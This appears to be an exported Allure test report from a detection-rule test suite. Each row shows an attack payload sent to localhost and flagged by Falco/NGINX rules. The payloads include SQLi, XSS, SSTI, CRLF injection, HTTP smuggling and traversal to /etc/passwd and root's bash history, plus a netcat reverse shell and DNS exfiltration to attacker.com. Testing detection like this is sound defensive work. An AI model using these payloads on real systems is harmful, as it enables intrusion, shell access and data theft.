"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_HDR_002` |
| **Name** | Custom Header Injection via CRLF |
| **Category** | CRLF |
| **Subcategory** | header_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\r\nX-Injected:true`
- **Encoded**: `%0d%0aX-Injected%3Atrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 13:55:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_002-1770818108889-eu5y3d pattern_id=CRLF_HDR_002 uri=/?q=%0d%0aX-Injected%3Atrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_002-1770818108889-eu5y3d pattern_id=CRLF_HDR_002 uri=/?q=%0d%0aX-Injected%3Atrue client=127.0.0.1

**Falco Log Entry**:
```
13:55:08.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_002-1770818108889-eu5y3d pattern_id=CRLF_HDR_002 uri=/?q=%0d%0aX-Injected%3Atrue client=127.0.0.1
```","1","test_e2e_with_logs[423_CRLF_HDR_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_014` |
| **Name** | Sleep with inline comment |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP(/*5*/5)`
- **Encoded**: `SLEEP%28/%2A5%2A/5%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~78000ms
- **Timestamp**: 13:53:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1770818034904-iv33db pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1770818034904-iv33db pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:53:54.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1770818034904-iv33db pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[109_SQLI_TIME_014]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_JINJA_001` |
| **Name** | Jinja2 basic template injection test |
| **Category** | SSTI |
| **Subcategory** | jinja2 |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{{7*7}}`
- **Encoded**: `%7B%7B7%2A7%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 13:54:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_001-1770818073388-ssm59m pattern_id=SSTI_JINJA_001 uri=/?q=%7B%7B7%2A7%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_001-1770818073388-ssm59m pattern_id=SSTI_JINJA_001 uri=/?q=%7B%7B7%2A7%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
13:54:33.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_001-1770818073388-ssm59m pattern_id=SSTI_JINJA_001 uri=/?q=%7B%7B7%2A7%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[435_SSTI_JINJA_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_008` |
| **Name** | Root bash history access |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../../../root/.bash_history`
- **Encoded**: `../../../../root/.bash_history`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~68000ms
- **Timestamp**: 13:54:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1770818044402-nh99ce pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1770818044402-nh99ce pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1

**Falco Log Entry**:
```
13:54:04.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1770818044402-nh99ce pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1
```","1","test_e2e_with_logs[246_PATH_DOT_008]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_002` |
| **Name** | Netcat reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `nc -e /bin/sh 10.0.0.1 4444`
- **Encoded**: `nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 13:54:23.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1770818063942-smoph pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1770818063942-smoph pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1

**Falco Log Entry**:
```
13:54:23.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1770818063942-smoph pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1
```","2","test_e2e_with_logs[360_CMD_REVSH_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_TE_CL_001` |
| **Name** | TE.CL Basic Smuggling |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | te_cl |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `Content-Length: 0

`
- **Encoded**: `Content-Length%3A%200%0D%0A%0D%0A`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~13000ms
- **Timestamp**: 13:54:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_001-1770818099390-r4b3ki pattern_id=HRS_TE_CL_001 uri=/?q=Content-Length%3A%200%0D%0A%0D%0A client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_001-1770818099390-r4b3ki pattern_id=HRS_TE_CL_001 uri=/?q=Content-Length%3A%200%0D%0A%0D%0A client=127.0.0.1

**Falco Log Entry**:
```
13:54:59.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_001-1770818099390-r4b3ki pattern_id=HRS_TE_CL_001 uri=/?q=Content-Length%3A%200%0D%0A%0D%0A client=127.0.0.1
```","1","test_e2e_with_logs[470_HRS_TE_CL_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_013` |
| **Name** | onmouseover event handler injection |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<a onmouseover=alert(1)>hover</a>`
- **Encoded**: `%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 13:53:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770818039405-6ziytu pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770818039405-6ziytu pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:53:59.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770818039405-6ziytu pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[198_XSS_REFL_013]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_004` |
| **Name** | Data URI XSS with slash bypass |
| **Category** | XSS |
| **Subcategory** | filter_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<script/src=data:,alert('XSS')>`
- **Encoded**: `%3Cscript%2Fsrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 13:54:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_004-1770818052435-1v4zzg pattern_id=XSS_BYPASS_004 uri=/?q=%3Cscript%2Fsrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_004-1770818052435-1v4zzg pattern_id=XSS_BYPASS_004 uri=/?q=%3Cscript%2Fsrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:12.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_004-1770818052435-1v4zzg pattern_id=XSS_BYPASS_004 uri=/?q=%3Cscript%2Fsrc%3Ddata%3A%2Calert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[138_XSS_BYPASS_004]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_004` |
| **Name** | DNS-based data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; nslookup `whoami`.attacker.com`
- **Encoded**: `%3B%20nslookup%20%60whoami%60.attacker.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 13:54:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1770818057423-s72m78 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1770818057423-s72m78 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1

**Falco Log Entry**:
```
13:54:17.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1770818057423-s72m78 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1
```","1","test_e2e_with_logs[324_CMD_BLIND_004]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_011` |
| **Name** | Basic pipe with id command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|id`
- **Encoded**: `%7Cid`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 13:54:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1770818048399-yi0g7 pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1770818048399-yi0g7 pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1

**Falco Log Entry**:
```
13:54:08.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1770818048399-yi0g7 pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1
```","1","test_e2e_with_logs[310_CMD_BASIC_011]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_057` |
| **Name** | Semicolon Variant |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..;/etc/passwd`
- **Encoded**: `..%3B%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 13:54:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1770818066456-yw8v1i pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1770818066456-yw8v1i pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
13:54:26.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1770818066456-yw8v1i pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[227_PATH_ADV_057]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_009` |
| **Name** | Keygen onfocus XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<keygen onfocus=alert('XSS') autofocus>`
- **Encoded**: `%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 13:53:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_009-1770818037400-qheze7 pattern_id=XSS_REFL_009 uri=/?q=%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_009-1770818037400-qheze7 pattern_id=XSS_REFL_009 uri=/?q=%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:53:57.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_009-1770818037400-qheze7 pattern_id=XSS_REFL_009 uri=/?q=%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[194_XSS_REFL_009]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_NEST_003` |
| **Name** | Triple nested substitution |
| **Category** | CMDINJ |
| **Subcategory** | nested_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$($($(echo cat) /etc/passwd))`
- **Encoded**: `%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 13:54:27.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=CMD_NEST_003-1770818067450-bgqfoq pattern_id=CMD_NEST_003 uri=/?q=%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd)) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=CMD_NEST_003-1770818067450-bgqfoq pattern_id=CMD_NEST_003 uri=/?q=%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd)) client=127.0.0.1

**Falco Log Entry**:
```
13:54:27.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=CMD_NEST_003-1770818067450-bgqfoq pattern_id=CMD_NEST_003 uri=/?q=%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd)) client=127.0.0.1
```","1","test_e2e_with_logs[340_CMD_NEST_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_006` |
| **Name** | Hex encoded slash traversal |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\x2f`
- **Encoded**: `..%5Cx2f`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 13:54:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1770818057935-ygmf2 pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1770818057935-ygmf2 pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1

**Falco Log Entry**:
```
13:54:17.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1770818057935-ygmf2 pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1
```","1","test_e2e_with_logs[220_PATH_ADV_006]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_HEX_001` |
| **Name** | Hex Encoded UNION SELECT |
| **Category** | SQLI |
| **Subcategory** | hex_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `0x27554e494f4e2053454c454354`
- **Encoded**: `0x27554e494f4e2053454c454354`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 13:54:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_HEX_001-1770818086531-z9r7wh pattern_id=SQLI_HEX_001 uri=/?q=0x27554e494f4e2053454c454354 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_HEX_001-1770818086531-z9r7wh pattern_id=SQLI_HEX_001 uri=/?q=0x27554e494f4e2053454c454354 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:46.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_HEX_001-1770818086531-z9r7wh pattern_id=SQLI_HEX_001 uri=/?q=0x27554e494f4e2053454c454354 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[079_SQLI_HEX_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
